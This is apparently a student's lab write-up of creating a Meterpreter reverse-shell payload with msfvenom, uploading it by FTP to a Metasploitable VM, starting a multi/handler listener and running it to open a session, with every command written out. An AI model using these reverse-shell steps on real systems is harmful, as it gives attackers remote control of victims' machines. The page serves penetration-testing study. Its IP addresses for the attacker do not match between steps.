---
title: ğŸ˜ˆ Establishing a Reverse Shell Using Metasploit and Msfvenom
permalink: /metasploit2
parent: Pentesting
---
# Establishing a Reverse Shell Using Metasploit and Msfvenom
{: .no_toc }

{: .note }
Pentesting, Ethical Hacking, Kali Linux, Metasploit, Metasploitable, Virtual Machines, Networking
{: .fs-3 }

#### Contents
{: .no_toc }
- TOC
{:toc}

## Scenario
In this Lab, Iâ€™ll be using Msfvenom and Metasploit to establish a reverse shell on a target machine. Msfvenom is a command line instance of Metasploit that is used to generate payloads, which is a piece of software that is designed to perform malicious actions on a target system. This payload must be delivered to and executed from the target machine. To do this, an attacker will use social engineering techniques or exploit a known vulnerability on the target machine. 

In this case, Iâ€™ll be creating a payload designed to establish a reverse shell. A reverse shell differs from a normal shell in that the target system initiates the connection back to the attackerâ€™s machine. This connection is established when the payload is executed by the user of the target machine. From the attackerâ€™s perspective, a benefit of establishing a reverse shell is that it may help bypass firewalls that block incoming traffic since the connection is coming from the target machine rather than the attackerâ€™s machine. 

## Goals & Objectives
1. Create a reverse shell payload using Metasploit and Msfvenom
3. Transfer the payload to the target machine.
4. Create a listener to "listen" for an incoming connection from the target machine.
6. Execute the payload on the target machine.

## Results
### ğŸ“„ Task 1: Run Metasploit and Msfvenom

![](/assets/images/101_77_metasploit2/step0.png)

### ğŸ“„ Task 2: Create the reverse shell payload

In Metasploit, I use the following command to create the reverse shell payload:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=5555 -f elf -o reverse-sh.elf
```

![](/assets/images/101_77_metasploit2/step1.png)

```-p linux/x86/meterpreter/reverse_tcp``` specifies the reverse shell payload  
```LHOST``` specifies the IP address of the machine I want the target machine to establish a connection with, which is the attackerâ€™s machine  
```LPORT``` specifies the port the target machine will connect through  
```-f``` specifies the file type. ELF, or Executable and Linkable Format, is a common file format for executable files  
```-o``` saves the payload with the chosen file name: reverse-sh.

<br>
<br>
### ğŸ“„ Task 3: Transfer the payload to the target machine

There are many ways an attacker can transfer a payload to a target machine, such as using social engineering techniques like phishing, USB baiting, or watering hole attacks. For the sake of simplicity, I am provided with the username and password of the target machine.

With those credentials, I can use FTP (file transfer protocol), which is a standard network protocol used to transfer files between devices on a network. I use the following commands:

```bash
ftp 192.168.28.128 
put reverse-sh.elf
by
```

![](/assets/images/101_77_metasploit2/step2a.png)

```ftp 192.168.28.128``` establishes the FTP session. 192.168.28.128 is the IP address of the target machine.
```put reverse-sh.elf``` sends the file to the target machine  
```by``` ends the session

<br>
<br>
### ğŸ“„ Task 4: Gain access to the target machine and make the payload executable

I access the target machine by establishing an SSH connection. The Metasploitable VM target machine has a default username and password of "msfadmin" which I use to log in to the machine.

![](/assets/images/101_77_metasploit2/step3.png)

Now that I have access to the target machine, I will give all users on the machine permissions to execute the payload. I use the following command: ```chmod +x reverse-sh.elf```

![](/assets/images/101_77_metasploit2/step4.png)

```chmod``` is the change mode command, which allows me to change the permissions of a file. ```+x``` adds executable permissions to all users. 

To see how changing file permissions works in Linux, see my [Managing File Permissions in Linux](/permissions) project.

<br>
<br>
### ğŸ“„ Task 5: Create a listener on the attackerâ€™s machine

In a reverse shell, the target machine is initiating the connection to the attackerâ€™s machine. In order for the attackerâ€™s machine to acknowledge the connection request from the target machine, a listener must be created on the attackerâ€™s machine. 

The listener essentially acts as a receiver, ready to accept the connection initiated by the reverse shell payload.

In a new terminal on Kali Linux, I initiate Metasploit once more by typing ```msfconsole```. Next, to specify that I want to use a listener, I type ```use exploit/multi/handler```. This tells Metasploit that I want to use the multi/handler module. With this module, I must specify three parameters: the local host (the attackerâ€™s machine), the local port (through which the connection will be established), and the payload type. The following commands establish these parameters:

```bash
set lhost 192.168.28.129  
set lport 5555  
set payload linux/x86/meterpreter/reverse_tcp  
run
```

![](/assets/images/101_77_metasploit2/step5.png)

The attacking machine is now listening for an incoming connection from the target machine.

<br>
<br>
### ğŸ“„ Task 6: Execute the payload on the target machine

Finally, with the reverse shell payload in position and the listener active on the attacking machine, I switch back to the first terminal where a connection to the target machine was established using SSH and I type the following:

```./reverse-sh.elf```

Once I hit enter, the reverse shell payload executes. The Metasploit terminal outputs that â€œMeterpreter session 1 opened.â€ This indicates that the target machine initated the connection request and the attacking machine accepted the connection.

To find out how a Meterpreter shell works, please refer to my [Upgrading to Meterpreter Shell Using Metasploit](/metasploit1) project. 

Next, I type shell to access the shell.

![](/assets/images/101_77_metasploit2/step6.png)

<br>
<br>
---

<a href="#top" id="back-to-top">Back to top</a>